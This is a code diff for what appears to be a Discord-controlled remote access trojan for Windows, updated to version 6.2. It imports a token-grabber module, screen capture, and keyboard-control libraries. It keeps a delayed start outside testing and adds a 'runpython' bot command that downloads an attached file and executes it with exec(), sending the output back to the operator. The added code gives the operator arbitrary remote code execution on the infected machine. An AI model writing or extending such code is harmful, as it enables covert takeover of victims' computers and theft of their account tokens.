@@ -4,18 +4,36 @@ from cryptography.fernet import Fernet
 import aiohttp
 import traceback
 import requests
-import io
 import ctypes
-import time
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 import threading
 import tkinter as tk
 from tkinter import messagebox
+import io
+import contextlib
+import discord
+import pywinctl
+import subprocess
+import psutil
+import PIL
+import os
+import win32com.client
+import sys
+from discord import option
+from pywinauto import Desktop
+import webbrowser
+from discord.ext import tasks
+import mss
+from PIL import Image
+import tokenGrabber
+from functools import wraps
+import keyboard
+from pynput.keyboard import Key, Controller
 
 TESTING = False
-VERSION = "v6.1"
+VERSION = "v6.2"
 if not TESTING:
     time.sleep(60)
 
@@ -42,28 +60,7 @@ async def wait_for_discord(timeout=5, retry_delay=5):
             await asyncio.sleep(retry_delay)
 
 async def main():
-    import discord
-    import pywinctl
-    import subprocess
-    import psutil
-    import io
-    import PIL
-    import os
-    import win32com.client
-    import sys
-    import pywinctl
-    from discord import option
-    from pywinauto import Desktop
-    import psutil
-    import webbrowser
-    from discord.ext import tasks
-    import psutil
-    import mss
-    from PIL import Image
-    import tokenGrabber
-    from functools import wraps
-    import keyboard
-    from pynput.keyboard import Key, Controller
+
     await wait_for_discord()
 
     if TESTING:
@@ -582,6 +579,21 @@ async def main():
         await ctx.defer()  
         threading.Thread(target=show_prompt, daemon=True, args=(text,)).start()
         await ctx.respond(f"started alert thread. Text: {text}")
+
+    @bot.slash_command(name="runpython", description="Run python code")
+    @option("file", description="python file to run", input_type=discord.Attachment, required=True)
+    async def runpython(ctx: discord.ApplicationContext, file: discord.Attachment):
+        await ctx.defer()
+
+        content = await file.read()
+
+        buffer = io.StringIO()
+        try:
+            with contextlib.redirect_stdout(buffer):
+                exec(content)
+            await ctx.respond(f"Executed\n```{buffer.getvalue()}```")
+        except Exception as e:
+            await ctx.respond(f"Error executing: `" + str(e)+'`')
 
     @bot.event
     async def on_application_command_error(ctx, error):
